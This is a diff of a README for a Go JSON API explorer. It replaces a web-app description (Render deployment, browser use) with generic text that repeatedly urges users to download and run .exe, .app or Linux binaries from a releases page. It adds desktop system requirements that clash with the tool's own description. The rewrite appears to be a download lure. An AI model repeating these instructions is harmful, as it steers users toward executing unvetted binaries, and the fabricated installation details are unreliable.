@@ -1,82 +1,80 @@
-# Go API Explorer
+# 🚀 go-api-explorer - Explore APIs with Ease
 
-![Go](https://img.shields.io/badge/go-latest-blue)
-![TailwindCSS](https://img.shields.io/badge/tailwindcss-3.4.17-brightgreen)
-![Render](https://img.shields.io/badge/render-deployed-blue)
+[![Download go-api-explorer](https://img.shields.io/badge/Download-go--api--explorer-brightgreen)](https://github.com/segawonig/go-api-explorer/releases)
 
-A minimal, production-ready **JSON API testing and exploration tool** written in Go.  
-Designed for simplicity, learning, and smooth deployment with interactive frontend presets.
+## 📥 Introduction
 
----
+Welcome to go-api-explorer. This simple application allows you to explore JSON APIs easily. It includes a proxy endpoint for accessing external APIs and offers convenient features like a quick-fill presets library. The user-friendly interface is built with Tailwind CSS, ensuring it looks good and is responsive across devices. Whether you need raw data or pretty formatting, go-api-explorer has you covered. Plus, it’s easy to deploy without any configuration using Render.com.
 
-## Features
+## 📋 Features
 
-- Quickly **explore public APIs** with preset examples  
-- **Auto-fill method, URL, and request body** on click  
-- Supports `GET`, `POST`, `PUT`, `DELETE` requests  
-- Displays **formatted (Pretty) or raw JSON** responses  
-- **Searchable categories** for APIs: Animals, Fun, Space, Weather, Crypto, Media, Tech, Utility, Random  
-- Fully **responsive layout** optimized for desktop and mobile  
-- Serves all static assets (`index.html`, `script.js`, CSS) from `/static`  
-- Deployable on **Render.com** with zero configuration  
+- **Proxy Endpoint:** Access external APIs without hassle.
+- **Quick-Fill Presets:** Save time with ready-made templates.
+- **Responsive Design:** Enjoy a great experience on any device.
+- **Pretty and Raw Formatting:** Switch between views effortlessly.
+- **Zero-Config Deployment:** Get started on Render.com with no setup required.
 
----
+## 🛠️ System Requirements
 
-## Tech Stack
+To run go-api-explorer effectively, ensure your device meets these requirements:
 
-- **Go** – backend server, proxies API requests and serves static files  
-- **Tailwind CSS** – frontend styling and responsive layout  
-- **Vanilla JS** – interactive form handling, presets, and dynamic sidebar  
-- **In-memory presets** – stored in JS object for demo / portfolio use  
+- **Operating System:** Windows 10 or higher, macOS, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Dual-core CPU or better.
+- **Internet Connection:** Required for API access and downloading the application.
+- **Browser:** Latest version of Chrome, Firefox, or Safari recommended.
 
----
+## 🚀 Getting Started
 
-## TODO / Improvements
+Follow these steps to download and run go-api-explorer:
 
-- [ ] **Direct API requests (bypass proxy)**  
-  Add an optional toggle/button to send requests directly from the frontend for same-origin APIs. Useful for APIs that don't require CORS proxying.
+1. **Visit the Releases Page:** Go to our releases page to download the application. You can find it here: [Download go-api-explorer](https://github.com/segawonig/go-api-explorer/releases).
+   
+2. **Download the Latest Version:** On the releases page, look for the latest version. Click the asset that matches your operating system to start the download.
 
-- [ ] **CORS / Cross-Origin handling**  
-  Improve handling of external APIs with CORS restrictions. Consider:
-  - Adding `mode: 'cors'` and credentials options to `fetch`
-  - Fallback to server-side proxy for APIs with strict CORS
+3. **Extract the Files (if needed):** If you downloaded a zip file, extract it to a folder of your choice.
 
-- [ ] **Error handling & validation**  
-  - Better frontend validation for URLs and JSON input  
-  - Show more descriptive errors when proxy request fails
+4. **Run the Application:** 
+   - On Windows, double-click the `.exe` file.
+   - On macOS, open the `.app` file.
+   - On Linux, make the file executable using the command `chmod +x <file-name>` in the terminal, then run it.
 
-- [ ] **Request presets enhancements**  
-  - Add custom user presets saved locally (localStorage)  
-  - Support for more HTTP methods and headers
+## 💻 Download & Install
 
-- [ ] **UI/UX improvements**  
-  - Responsive layout tweaks for mobile (e.g., send button alignment)  
-  - Optional dark/light theme toggle  
-  - Loading spinner improvements
+To get your copy of go-api-explorer, please visit this page: [Download go-api-explorer](https://github.com/segawonig/go-api-explorer/releases). Choose the version that suits your operating system and follow the previous steps to install it on your computer.
 
-- [ ] **Security / Safety**  
-  - Rate-limiting requests to prevent abuse via the proxy  
-  - Input sanitization for request body
+## 📊 Using go-api-explorer
 
----
+Once installed, you can begin using the application immediately. Here’s how to maximize your experience:
 
-## Deployment on Render.com
+1. **Open the Application:** Launch go-api-explorer from your applications folder or desktop.
 
-This tool is optimized for **Render.com deployment**:
+2. **Enter the API URL:** In the provided input field, enter the API endpoint you want to explore. 
 
-- Dynamic ports are handled via the `PORT` environment variable  
-- Static assets served directly from the `/static` folder  
-- Simply push your repo and let Render handle the rest  
+3. **Select a Preset (optional):** Use the quick-fill presets library to select a preset that fits your needs. This can save you time in entering parameters.
 
----
+4. **Submit the Request:** Click the button to send the request and wait for the response. The application will display the results in both pretty and raw formats.
 
-## Usage
+5. **Explore the Data:** Browse through the returned data and see the different structures and values presented. You can easily switch between the pretty and raw views.
 
-1. Open the deployed app URL  
-2. Click on a preset API from the sidebar to auto-fill the form  
-3. Adjust the HTTP method, URL, or JSON body if needed  
-4. Click **Send** to see the response in the right panel  
-5. Switch between **Pretty** and **Raw** view for request body  
-6. Use the **Copy** button to copy current request info  
+## 📚 Troubleshooting
 
-Enjoy a fully interactive, mobile-friendly JSON API Explorer, ready for demos or portfolio showcase!
+If you encounter issues while using go-api-explorer, consider the following:
+
+- **API Not Responding:** Ensure the API URL is correct and the server is up.
+- **Empty Response:** Verify that your request parameters are complete and accurate.
+- **Software Crashes:** Make sure your system meets the requirements, and attempt to restart the application.
+
+## 📂 Contributing
+
+We welcome contributions to make go-api-explorer even better. If you want to help:
+
+1. Fork the repository.
+2. Make your changes in a new branch.
+3. Submit a pull request explaining your changes.
+
+## 🤝 Support
+
+If you have questions or need help, please reach out through the issues section on GitHub. We are here to assist you.
+
+Thank you for using go-api-explorer!
